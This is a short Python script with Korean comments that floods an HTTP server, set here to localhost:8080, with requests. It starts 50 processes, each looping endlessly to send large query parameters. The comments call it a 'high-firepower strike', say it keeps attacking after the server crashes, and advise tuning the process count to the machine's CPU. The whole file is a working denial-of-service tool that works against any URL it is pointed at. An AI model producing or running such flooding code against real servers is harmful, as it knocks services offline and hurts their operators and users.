import requests
from multiprocessing import Process
import time

url = "http://127.0.0.1:8080"

def heavy_attack():
    print("고화력 집중 타격 중...")
    # 세션을 유지하면서 계속해서 데이터를 요청함
    session = requests.Session()
    while True:
        try:
            # 서버가 계산을 많이 하도록 큰 헤더나 무작위 파라미터를 보냄
            session.get(url, params={"data": "A"*5000}, timeout=1)
        except:
            # 에러가 나면(서버가 뻗으면) 바로 다음 공격 준비
            time.sleep(0.01)

if __name__ == "__main__":
    # 프로세스 개수를 대폭 늘리세요. (CPU 코어의 2~3배 권장)
    # 본인 컴퓨터 사양에 맞게 30~50개 정도로 설정해보세요.
    for i in range(50):
        Process(target=heavy_attack).start()